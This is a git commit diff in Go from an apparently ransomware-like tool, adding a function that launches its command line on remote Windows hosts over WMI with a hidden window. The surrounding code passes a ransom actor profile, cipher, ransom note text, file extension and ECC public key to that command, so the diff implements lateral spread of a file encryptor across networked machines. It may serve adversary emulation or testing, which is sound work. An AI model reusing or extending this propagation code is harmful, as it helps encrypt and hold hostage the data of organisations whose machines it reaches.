e11a0809de5618ced8d565e50063ffb568fb64df
panscan <joeavanzato@gmail.com>
2025-04-20 19:40:08 -0400

    - Initial implementation of WMI launch

--- remote_execution.go
+++ remote_execution.go
@@ -2,9 +2,13 @@ package main
 
 import (
 	"fmt"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 	"io"
 	"os"
+	"strings"
 	"sync"
+	"unsafe"
 )
 
 func handleRemoteTargets(targets []string, args map[string]any, extension string, notename string, note string, group RansomActor, cipher string) {
@@ -93,18 +97,114 @@ func handleRemoteTargets(targets []string, args map[string]any, extension string
 			} else if args["ecc_public"].(string) != "" {
 				commandLine = fmt.Sprintf("%s -ecc_public %s", commandLine, keyLocation)
 			}
-			fmt.Println(commandLine)
+
+			// Always skip shares when deplopying remotely
+			commandLine = fmt.Sprintf("%s -skipshares", commandLine)
+
+			execute(commandLine, target, args["exec_method"].(string))
 		}()
 	}
 	printFormattedMessage("Waiting for all remote targets to startup", INFO)
 	wg.Wait()
 }
 
-func execute() {
+func execute(commandLine string, target string, method string) {
 	// If wmi, we will launch a process remotely
-	// If task, we will create a remote scheduled task and immediately invoke
-	// If service, we will create a remote sece and immediately invokervi
-	// If reg, will set a startup item in the registry to launch at next logon
-	// If startup, will use startup folder
-	// If mmc, wil use specific COM methodology
+	if strings.ToLower(method) == "wmi" {
+		executeWMI(commandLine, target)
+	} else if strings.ToLower(method) == "service" {
+		printFormattedMessage("Service method not yet implemented", ERROR)
+	} else if strings.ToLower(method) == "schtask" {
+		printFormattedMessage("Scheduled task method not yet implemented", ERROR)
+	} else if strings.ToLower(method) == "reg" {
+		printFormattedMessage("Registry method not yet implemented", ERROR)
+	} else if strings.ToLower(method) == "startup" {
+		printFormattedMessage("Startup method not yet implemented", ERROR)
+	} else if strings.ToLower(method) == "mmc" {
+		printFormattedMessage("MMC method not yet implemented", ERROR)
+	} else {
+		printFormattedMessage(fmt.Sprintf("Unknown method %s specified", method), ERROR)
+		return
+	}
+
+}
+
+func executeWMI(commandLine string, target string) {
+	printFormattedMessage(fmt.Sprintf("Executing command on target %s: %s", target, commandLine), INFO)
+	err := ExecuteCommandRemoteWMI(target, commandLine)
+	if err != nil {
+		printFormattedMessage(fmt.Sprintf("Failed to execute command on target %s: %s", target, err.Error()), ERROR)
+	}
+}
+
+func ExecuteCommandRemoteWMI(remoteHost, command string) error {
+	// Initialize COM
+	if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
+		return fmt.Errorf("failed to initialize COM: %v", err)
+	}
+	defer ole.CoUninitialize()
+
+	// Connect to WMI on remote host
+	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
+	if err != nil {
+		return fmt.Errorf("failed to create WbemScripting object: %v", err)
+	}
+	defer unknown.Release()
+
+	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
+	if err != nil {
+		return fmt.Errorf("failed to query WMI interface: %v", err)
+	}
+	defer wmi.Release()
+
+	// Connect to the remote host
+	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer", remoteHost, "root\\cimv2")
+	if err != nil {
+		return fmt.Errorf("failed to connect to remote host %s: %v", remoteHost, err)
+	}
+	service := serviceRaw.ToIDispatch()
+	defer service.Release()
+
+	// Create and execute the process
+	processStartup := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_ProcessStartup")))))
+	defer processStartup.Clear()
+
+	processClass := oleutil.MustCallMethod(service, "Get", processStartup).ToIDispatch()
+	defer processClass.Release()
+
+	processInstance := oleutil.MustCallMethod(processClass, "SpawnInstance_").ToIDispatch()
+	defer processInstance.Release()
+
+	// Set process properties to hide window
+	oleutil.PutProperty(processInstance, "ShowWindow", ole.NewVariant(ole.VT_I4, 0))
+
+	// Create process
+	process := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_Process")))))
+	defer process.Clear()
+
+	processClass = oleutil.MustCallMethod(service, "Get", process).ToIDispatch()
+	defer processClass.Release()
+
+	// Execute the command
+	methodName := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Create")))))
+	defer methodName.Clear()
+
+	cmd := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString(command)))))
+	defer cmd.Clear()
+
+	currentDir := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("")))))
+	defer currentDir.Clear()
+
+	result, err := oleutil.CallMethod(processClass, "Create", cmd, currentDir, processInstance, 0)
+	if err != nil {
+		return fmt.Errorf("failed to execute command: %v", err)
+	}
+
+	// Get return code
+	returnValue := int(result.Val)
+	if returnValue != 0 {
+		return fmt.Errorf("process creation failed with code %d", returnValue)
+	}
+
+	return nil
 }
